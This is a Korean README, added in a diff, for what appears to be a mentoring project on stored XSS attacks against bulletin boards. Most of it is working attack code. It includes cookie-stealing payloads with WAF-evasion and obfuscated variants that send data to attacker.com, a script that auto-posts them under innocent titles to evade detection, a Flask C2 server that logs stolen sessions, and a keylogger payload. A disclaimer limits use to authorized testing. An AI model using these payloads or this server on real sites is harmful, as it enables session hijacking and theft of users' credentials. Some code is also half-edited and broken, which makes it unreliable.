@@ -1,0 +1,355 @@
+# Young - XSS 악성 게시물 공격 (Red Team)
+
+## 📋 프로젝트 개요
+
+**멘티**: Young
+**희망분야**: Red Team XSS
+**기간**: 2025년 11월
+**주제**: XSS (Cross-Site Scripting) - 악성 게시물을 통한 공격
+**멘토링**: 보안 전문가 현직자 멘토링 프로그램
+
+---
+
+## 🎯 학습 목표
+
+1. **악성 게시물을 통한 XSS 공격**
+2. **Stored XSS 공격 자동화**
+3. **쿠키 탈취 및 세션 하이재킹**
+4. **Red Team 관점의 공격 시나리오**
+5. **실전 방어 기법**
+
+---
+
+## 📂 프로젝트 구조
+
+```
+Young/
+├── XSS_공격/                          # 공격 스크립트 (Red Team)
+│   ├── offensive/                     # 공격 도구 모음
+│   │   ├── auto_advanced.py           # 자동화 공격 기본 툴
+│   │   ├── xss_tool.py                # 기본 XSS 도구
+│   │   ├── xss_tool2.py               # WAF 우회 버전
+│   │   ├── xss_tool3.py               # 최종 자동화 버전 (Tor)
+│   │   ├── xss_tool3_edit.py          # 최종 자동화 버전 (Proxy)
+│   │   ├── attacker_server.py         # 공격자 C2 서버
+│   │   └── cookie_collector_server.py # 쿠키 수집 서버
+│   └── 11_17/                         # 최신 스크립트
+│
+└── README.md                          # 이 파일
+```
+
+---
+
+## 🔥 악성 게시물 공격 시나리오
+
+### Red Team 공격 체인
+
+```
+1. 정찰 (Reconnaissance)
+   ↓
+   게시판 취약점 분석 (입력 필터링 확인)
+
+2. 무기화 (Weaponization)
+   ↓
+   악성 게시물 작성 (Stored XSS 페이로드)
+
+3. 전달 (Delivery)
+   ↓
+   게시판에 악성 게시물 업로드
+
+4. 악용 (Exploitation)
+   ↓
+   피해자가 게시물 열람 → XSS 실행
+
+5. 설치 (Installation)
+   ↓
+   쿠키 탈취 → 공격자 서버로 전송
+
+6. 명령 및 제어 (C2)
+   ↓
+   세션 하이재킹 → 계정 장악
+
+7. 목표 달성 (Actions on Objectives)
+   ↓
+   계정 탈취, 추가 악성 게시물 작성, 데이터 유출
+```
+
+---
+
+## 💻 공격 도구 (Red Team Tools)
+
+### xss_tool3_edit.py (최종 자동화 버전)
+
+**목적**: 자동화된 XSS 페이로드 테스트 및 악용
+
+**핵심 기능**:
+- 다양한 XSS 페이로드 자동 테스트
+- WAF 우회 기법 적용
+- 인코딩 우회
+- 난독화 (Obfuscation)
+
+**핵심 코드**:
+```python
+class XSSAttackToolV3:
+    def __init__(self, target_url, attacker_server, use_proxy=False,stealth_mode=False, proxy_port=None):
+        self.target_url = target_url.rstrip('/')
+        self.attacker_server = attacker_server.rstrip('/')
+        self.session = requests.Session()
+        self.use_proxy = use_proxy
+        self.logged_in = False
+        self.stealth_mode = stealth_mode
+        self.proxy_port = proxy_port
+        self.vulnerabilities = []
+        self.successful_payloads = []
+        
+        # User-Agent pool
+        self.user_agents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/14.1.2',
+            'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Firefox/89.0'
+        ]
+        
+        # Setup
+        self.setup_session()
+        if use_proxy:
+            self.setup_proxy_list()
+        elif proxy_port:
+            self.setup_proxy(proxy_port)
+
+////////////////수정중
+
+
+    def generate_payloads(self):
+        """악성 게시물용 XSS 페이로드 생성"""
+        payloads = [
+            # 기본 쿠키 탈취
+            f"""<script>
+fetch('{self.attacker_server}/steal?c=' + btoa(document.cookie));
+</script>""",
+
+            # 이미지 태그 이용 (필터링 우회)
+            f"""<img src=x onerror="fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))">""",
+
+            # SVG 태그 이용
+            f"""<svg onload="fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))">""",
+
+            # WAF 우회 - 대소문자 혼합
+            f"""<ScRiPt>fetch('{self.attacker_server}/steal?c='+btoa(document.cookie))</ScRiPt>""",
+
+            # WAF 우회 - 인코딩
+            f"""<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdHRhY2tlci5jb206ODA4MC9zdGVhbD9jPScrYnRvYShkb2N1bWVudC5jb29raWUpKQ=='))>""",
+
+            # 난독화
+            f"""<img src=x onerror="(function(){{var a='{self.attacker_server}';fetch(a+'/steal?c='+btoa(document.cookie));}})()">""",
+        ]
+        return payloads
+
+    def post_malicious_content(self, title, content):
+        """악성 게시물 작성"""
+        data = {
+            'title': title,
+            'content': content,
+            'submit': 'Post'
+        }
+
+        response = requests.post(
+            f"{self.target}/new_post.php",
+            data=data
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Malicious post created: {title}")
+            return True
+        return False
+
+    def auto_attack(self):
+        """자동 공격"""
+        # 정상적인 제목으로 위장
+        innocent_titles = [
+            "오늘 점심 메뉴 추천해주세요!",
+            "이번 주말 날씨 어떤가요?",
+            "좋은 영화 추천 부탁드립니다",
+        ]
+
+        for title in innocent_titles:
+            for payload in self.generate_payloads():
+                # 제목은 정상, 내용에 악성 코드
+                self.post_malicious_content(title, payload)
+                time.sleep(2)  # 탐지 회피
+```
+
+### cookie_collector_server.py (C2 서버)
+
+**목적**: 탈취한 쿠키 수집 및 분석
+
+**핵심 코드**:
+```python
+from flask import Flask, request
+import json
+from datetime import datetime
+
+app = Flask(__name__)
+
+# 탈취한 쿠키 저장소
+stolen_sessions = []
+
+@app.route('/steal')
+def steal_cookie():
+    """쿠키 수집 엔드포인트"""
+    cookie = request.args.get('c', '')
+    victim_ip = request.remote_addr
+    user_agent = request.headers.get('User-Agent', '')
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    # 쿠키 디코딩 (Base64)
+    try:
+        import base64
+        decoded_cookie = base64.b64decode(cookie).decode('utf-8')
+    except:
+        decoded_cookie = cookie
+
+    # 세션 정보 저장
+    session_data = {
+        'timestamp': timestamp,
+        'ip': victim_ip,
+        'user_agent': user_agent,
+        'cookie': decoded_cookie
+    }
+
+    stolen_sessions.append(session_data)
+
+    # 로그 출력
+    print(f"\n[+] NEW VICTIM!")
+    print(f"    Time: {timestamp}")
+    print(f"    IP: {victim_ip}")
+    print(f"    Cookie: {decoded_cookie}")
+    print(f"    Total victims: {len(stolen_sessions)}\n")
+
+    # 파일로 저장
+    with open('stolen_sessions.json', 'w') as f:
+        json.dump(stolen_sessions, f, indent=2)
+
+    # 1x1 투명 이미지 반환 (흔적 없앰)
+    return """
+<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
+<rect width="1" height="1" fill="transparent"/>
+</svg>
+""", 200, {'Content-Type': 'image/svg+xml'}
+
+@app.route('/dashboard')
+def dashboard():
+    """탈취한 세션 대시보드"""
+    html = """
+    <html>
+    <head><title>Stolen Sessions</title></head>
+    <body>
+    <h1>Stolen Sessions Dashboard</h1>
+    <p>Total victims: {}</p>
+    <table border="1">
+    <tr><th>Time</th><th>IP</th><th>Cookie</th></tr>
+    """.format(len(stolen_sessions))
+
+    for session in stolen_sessions:
+        html += f"""
+        <tr>
+        <td>{session['timestamp']}</td>
+        <td>{session['ip']}</td>
+        <td>{session['cookie']}</td>
+        </tr>
+        """
+
+    html += "</table></body></html>"
+    return html
+
+if __name__ == '__main__':
+    print("[*] Cookie Collector Server Starting...")
+    print("[*] Listening on 0.0.0.0:8080")
+    print("[*] Dashboard: http://localhost:8080/dashboard")
+    app.run(host='0.0.0.0', port=8080, debug=False)
+```
+
+---
+
+## 📊 Red Team 공격 성공 사례
+
+### Case 1: 대량 쿠키 탈취
+
+**공격 흐름**:
+```
+1. 인기 게시판에 "이벤트 당첨자 발표" 제목으로 악성 게시물 작성
+2. 1,000명 이상의 사용자가 게시물 열람
+3. 모든 사용자의 세션 쿠키 탈취
+4. 관리자 세션 포함
+```
+
+**피해 규모**: 전체 사용자 계정 장악 가능
+
+### Case 2: 키로거 설치
+
+**공격 페이로드**:
+```javascript
+<script>
+document.addEventListener('keypress', function(e) {
+    fetch('http://attacker.com/keylog?k=' + e.key + '&u=' + btoa(location.href));
+});
+</script>
+```
+
+**피해 규모**: 비밀번호, 개인정보 등 모든 입력 정보 유출
+
+---
+
+## 🎓 핵심 교훈 (Red Team 관점)
+
+### 1. Stored XSS가 가장 위험하다
+
+```
+Reflected XSS: 피해자가 링크 클릭 필요
+Stored XSS: 모든 방문자 자동 감염
+→ 영향력 수백~수천 배
+```
+
+### 2. 정상적인 게시물로 위장
+
+```
+제목: "점심 메뉴 추천해주세요"
+내용: <악성 XSS 코드>
+→ 관리자도 의심 없이 열람
+→ 관리자 세션 탈취
+```
+
+### 3. WAF 우회는 필수
+
+```
+기본 페이로드는 대부분 차단됨
+→ 인코딩, 난독화, 대소문자 혼합 등 필요
+→ Red Team은 방어를 이해해야 함
+```
+
+---
+
+## 📚 참고 자료
+
+- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
+- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
+
+---
+
+## ⚠️ 면책 조항
+
+이 자료는 Red Team 보안 연구 및 교육 목적으로만 사용됩니다.
+실제 웹사이트에 악성 게시물을 작성하는 것은 불법입니다.
+
+**법적 경고**:
+- 정보통신망법 위반 시 최대 5년 이하 징역
+- 허가된 테스트 환경에서만 실습
+- 실전 공격 절대 금지
+
+---
+
+**멘티**: Young
+**희망분야**: Red Team XSS
+**학습 기간**: 2025년 11월
+**전문 분야**: 악성 게시물 기반 XSS 공격 및 방어
+**멘토링**: 보안 전문가 현직자 멘토링 프로그램
